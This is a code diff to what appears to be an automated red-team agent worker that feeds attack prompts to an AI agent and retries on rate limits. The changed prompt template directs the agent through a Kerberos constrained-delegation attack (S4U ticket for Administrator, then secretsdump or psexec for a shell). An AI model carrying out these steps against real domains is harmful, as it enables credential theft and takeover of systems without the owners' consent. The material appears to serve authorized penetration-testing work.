@@ -45,7 +45,9 @@ if TYPE_CHECKING:
 
 
 # Rate limit retry configuration
-RATE_LIMIT_BACKOFF_DELAYS = [30.0, 60.0, 120.0]  # Exponential backoff: 30s, 60s, 120s
+# Short delays because TPM window resets every 60s; with max_concurrent_tasks=1
+# we only need to wait for the window to roll over
+RATE_LIMIT_BACKOFF_DELAYS = [5.0, 10.0, 20.0, 40.0, 60.0, 60.0]  # 6 retries with short waits
 RATE_LIMIT_MAX_RETRIES = len(RATE_LIMIT_BACKOFF_DELAYS)
 
 
@@ -1269,11 +1271,15 @@ def generate_prompt_from_task(  # noqa: PLR0912
             if "/" in target_spn:
                 target_hostname = target_spn.split("/", 1)[1]
 
+            # target contains the IP address from the task payload
+            target_ip = payload.get("target_ip", target)
+
             delegation_prompt = (
                 f"**CONSTRAINED DELEGATION EXPLOITATION**\n\n"
                 f"Account with delegation: {account}\n"
                 f"Target SPN: {target_spn}\n"
                 f"Target Host: {target_hostname}\n"
+                f"Target IP: {target_ip}\n"
                 f"Domain: {domain}\n"
                 f"Task ID: {task.task_id}\n\n"
                 "**STEP 1: S4U ATTACK (Get Administrator ticket)**\n"
@@ -1297,14 +1303,16 @@ def generate_prompt_from_task(  # noqa: PLR0912
                 f"    target='{target_hostname}',\n"
                 f"    username='Administrator',\n"
                 f"    domain='{domain}',\n"
-                f"    ticket_path='<ccache_file_from_step_1>'"
+                f"    ticket_path='<ccache_file_from_step_1>',\n"
+                f"    target_ip='{target_ip}'"
             )
             if dc_ip:
                 delegation_prompt += f",\n    dc_ip='{dc_ip}'"
             delegation_prompt += (
                 "\n)\n"
                 "```\n"
-                "**IMPORTANT:** Replace <ccache_file_from_step_1> with actual .ccache path from s4u_attack output!\n\n"
+                "**IMPORTANT:** Replace <ccache_file_from_step_1> with actual .ccache path from s4u_attack output!\n"
+                f"**IMPORTANT:** Always use target_ip='{target_ip}' to avoid DNS resolution issues!\n\n"
                 "**STEP 3: ALTERNATIVE - PSEXEC_KERBEROS FOR SHELL**\n"
                 "If secretsdump fails or you need a shell:\n"
                 "```\n"
@@ -1313,7 +1321,8 @@ def generate_prompt_from_task(  # noqa: PLR0912
                 f"    username='Administrator',\n"
                 f"    domain='{domain}',\n"
                 f"    ticket_path='<ccache_file_from_step_1>',\n"
-                f"    command='cmd /c whoami && hostname'"
+                f"    command='cmd /c whoami && hostname',\n"
+                f"    target_ip='{target_ip}'"
             )
             if dc_ip:
                 delegation_prompt += f",\n    dc_ip='{dc_ip}'"
@@ -1808,8 +1817,11 @@ class RedisWorkerAgent:
                 return
 
             # Run agent with rate limit retry
+            # Note: Rate limit errors can appear as:
+            # 1. Exceptions raised during _run_agent()
+            # 2. Errors returned in result.error or result.last_error (dreadnode SDK catches them)
             result = None
-            last_rate_limit_error: Exception | None = None
+            last_rate_limit_error: str | Exception | None = None
             for attempt in range(RATE_LIMIT_MAX_RETRIES + 1):
                 try:
                     attempt_msg = (
@@ -1819,6 +1831,28 @@ class RedisWorkerAgent:
                         f"[{self.agent_name}] Running agent for task {task.task_id}{attempt_msg}"
                     )
                     result = await self._run_agent(prompt)
+
+                    # Check if rate limit error was returned in result (SDK catches exceptions)
+                    result_error = getattr(result, "error", None) or getattr(
+                        result, "last_error", None
+                    )
+                    if result_error and _is_rate_limit_error(Exception(str(result_error))):
+                        if attempt < RATE_LIMIT_MAX_RETRIES:
+                            delay = RATE_LIMIT_BACKOFF_DELAYS[attempt]
+                            logger.warning(
+                                f"[{self.agent_name}] ⏳ Rate limit in result for task {task.task_id}, "
+                                f"backing off {delay}s (attempt {attempt + 1}/{RATE_LIMIT_MAX_RETRIES}): "
+                                f"{result_error}"
+                            )
+                            last_rate_limit_error = str(result_error)
+                            result = None  # Clear result to retry
+                            await asyncio.sleep(delay)
+                            continue
+                        # Out of retries - will be handled below
+                        last_rate_limit_error = str(result_error)
+                        result = None
+                        break
+
                     if attempt > 0:
                         logger.success(
                             f"[{self.agent_name}] Task {task.task_id} succeeded after {attempt} retries"
@@ -1828,7 +1862,7 @@ class RedisWorkerAgent:
                     if _is_rate_limit_error(e) and attempt < RATE_LIMIT_MAX_RETRIES:
                         delay = RATE_LIMIT_BACKOFF_DELAYS[attempt]
                         logger.warning(
-                            f"[{self.agent_name}] ⏳ Rate limit hit for task {task.task_id}, "
+                            f"[{self.agent_name}] ⏳ Rate limit exception for task {task.task_id}, "
                             f"backing off {delay}s (attempt {attempt + 1}/{RATE_LIMIT_MAX_RETRIES}): {e}"
                         )
                         last_rate_limit_error = e
@@ -1838,7 +1872,12 @@ class RedisWorkerAgent:
 
             if result is None:
                 # All retries exhausted due to rate limits
-                raise last_rate_limit_error or RuntimeError("Agent returned no result")
+                error_msg = (
+                    str(last_rate_limit_error)
+                    if last_rate_limit_error
+                    else "Agent returned no result"
+                )
+                raise RuntimeError(f"Rate limit retries exhausted: {error_msg}")
 
             result_text = self._extract_result(result)
             agent_error = self._extract_agent_error(result)
